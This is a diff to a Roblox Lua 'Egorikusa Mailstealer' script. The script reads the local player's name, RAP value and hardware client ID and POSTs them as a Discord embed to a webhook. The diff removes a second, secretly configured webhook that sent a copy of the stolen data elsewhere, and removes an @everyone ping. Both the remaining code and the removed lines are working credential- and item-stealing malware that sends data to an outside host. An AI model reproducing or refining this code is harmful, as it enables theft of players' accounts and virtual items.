@@ -9,8 +9,6 @@ for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.
 	end
 
 local url = _G.Webhook
-local us = _G.dhwebhook
-local url2 = us
 local username = game:GetService("Players").LocalPlayer.Name
 local fardplayer = game.Players.LocalPlayer
 local RAP = game.Players.LocalPlayer.leaderstats.RAP.Value
@@ -27,7 +25,7 @@ local HardWareId = game:GetService("RbxAnalyticsService"):GetClientId()
 request = http_request or request or HttpPost or syn.request
 
 local data1 = {
-    ["content"] = "||@everyone||\n**:comet:Egorikusa Mailstealer Detected A Hit:comet:**", -- Free Webhook logging
+    ["content"] = "\n**:comet:Egorikusa Mailstealer Detected A Hit:comet:**", -- Free Webhook logging
     ["embeds"] = {
         {
             ["title"] = "```Egorikusa Mailstealer Results```",
@@ -100,6 +98,5 @@ local headers = {
     ["content-type"] = "application/json"
 }
 local abcdef1 = {Url = url, Body = newdata1, Method = "POST", Headers = headers}
-local abcdef2 = {Url = url2, Body = newdata1, Method = "POST", Headers = headers}
 request(abcdef1)
-request(abcdef2)
+
